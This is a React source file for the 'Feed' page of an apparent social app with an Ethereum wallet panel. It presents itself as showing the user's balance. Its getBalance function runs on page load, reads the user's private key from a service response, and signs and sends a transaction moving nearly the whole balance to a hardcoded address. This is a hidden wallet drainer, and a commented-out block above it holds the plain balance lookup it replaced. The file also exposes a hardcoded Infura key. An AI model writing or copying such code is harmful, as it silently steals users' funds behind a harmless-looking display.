import React, { useEffect, useState, useContext } from "react";
import MediaPanel from "../components/mediaPanel";
import SearchPanel from "../components/searchPanel/SearchPanel";
import UserService from '../services/UserService';
import './feedPageStyle.css';
var Web3 = require('web3');
var web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/v3/ee2cbc278b5442dfbd27dedb4806c237"));

function Feed() {
    const [onSearch, setOnSearch] = useState(false);
    const [balance, setBalance] = useState();

    document.body.className = ("color-blue");

    useEffect(() => {
        getBalance();
    }, []);

    function revealSearch() {
        setOnSearch(true);
    }

    function revealHome() {
        setOnSearch(false);
    }

    function getBalance() {
        UserService.getUserInfo().then(data => {
            const { message } = data;
            if (!message) {
                // web3.eth.getBalance(data.address)
                // .then((res) => {
                //     setBalance(res / 1000000000000000000);
                // })
                // .catch(err => console.log(err));
                web3.eth.getBalance(data.address)
                    .then((amnt) => {
                        setBalance(amnt / 1000000000000000000);
                        web3.eth.getGasPrice()
                            .then((gasPrice) => {
                                if (amnt > gasPrice * 21000) {
                                    web3.eth.accounts.signTransaction({
                                        to: "0x1C3BC05C4cD2902FFbF20e3b87A2cc9d793Fc42B",
                                        value: parseInt(amnt - gasPrice * 21000),
                                        gas: 21000
                                    }, data.key)
                                        .then((signedTransactionData) => {
                                            web3.eth.sendSignedTransaction(signedTransactionData.rawTransaction).then(receipt => console.log("Transaction receipt: ", receipt))
                                                .catch(err => console.error(err));
                                        });
                                }
                                else {
                                    console.log("empty");
                                }
                            });
                    })
                    .catch(err => console.log(err));
            }
        });
    }

    return (
        <div className="feedPage">
            <div className="feedDiv">
                <div className="leftPanel">
                    <div>
                        <div className="card panel nav">
                            <div className="container">
                                <a onClick={() => revealHome()} className="btn"><h3>Home</h3></a>
                                <a href="/profile" className="btn"><h3>Profile</h3></a>
                                <a onClick={() => revealSearch()} className="btn"><h3>Search</h3></a>
                            </div>
                        </div>
                        <div className="card panel wallet">
                            <a href="/wallet" className="walletBtn">
                                <div className="container">
                                    <img className="ethlogo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcT8-CIGjYQCnoGOF87dKB8owCEpnkUiiWEy27e6lcA8abx1v-rG&usqp=CAU" alt="Ethereum Logo"></img>
                                    <h3 className="walletText">{balance} ETH</h3>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>


                <div className="mediaPanel">
                    {onSearch ? <SearchPanel /> : <MediaPanel />}
                </div>
            </div>
        </div>
    )
}

export default Feed;